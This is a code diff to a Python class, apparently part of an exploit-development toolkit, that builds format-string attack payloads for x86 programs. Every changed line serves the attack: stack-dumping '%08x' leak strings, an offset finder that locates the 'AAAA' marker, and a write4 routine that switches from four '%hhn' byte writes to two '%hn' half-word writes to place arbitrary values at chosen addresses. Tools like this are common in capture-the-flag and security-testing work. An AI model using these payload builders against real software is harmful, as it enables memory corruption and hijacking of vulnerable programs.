@@ -636,13 +636,20 @@ class FormatStr:
         # x86 only
         self.offset = offset
 
-    def dump_stack(self, size, start=1):
+    def dump_stack(self, size, start=None):
         buf = 'AAAA'
-        i = start
-        while len(buf) < size:
-            buf += ".%%%d$08x" % i
-            i += 1
+        if start > 1:
+            i = start
+            while len(buf) < size:
+                buf += ".%%%d$08x" % i
+                i += 1
+        else:
+            while len(buf) < size:
+                buf += '.%08x'
         return buf[:size]
+
+    def calc_offset(self, s):
+        return s.split('.').index('41414141')
 
     def gets(self, addr):
         buf = struct.pack('<I', addr)
@@ -650,18 +657,14 @@ class FormatStr:
         return buf
 
     def write4(self, addr, value):
-        buf = struct.pack('<IIII', addr, addr+1, addr+2, addr+3)
+        buf = struct.pack('<II', addr, addr+2)
 
-        n = map(ord, struct.pack('<I', value))
-        n[3] = ((n[3]-n[2]-1) % 0x100) + 1
-        n[2] = ((n[2]-n[1]-1) % 0x100) + 1
-        n[1] = ((n[1]-n[0]-1) % 0x100) + 1
-        n[0] = ((n[0]-len(buf)-1) % 0x100) + 1
+        n = [(value & 0xFFFF), ((value>>16) & 0xFFFF)]
+        n[1] = ((n[1]-n[0]-1) % 0x10000) + 1
+        n[0] = ((n[0]-len(buf)-1) % 0x10000) + 1
 
-        buf += "%%%dc%%%d$hhn" % (n[0], self.offset)
-        buf += "%%%dc%%%d$hhn" % (n[1], self.offset+1)
-        buf += "%%%dc%%%d$hhn" % (n[2], self.offset+2)
-        buf += "%%%dc%%%d$hhn" % (n[3], self.offset+3)
+        buf += "%%%dc%%%d$hn" % (n[0], self.offset)
+        buf += "%%%dc%%%d$hn" % (n[1], self.offset+1)
 
         return buf
 
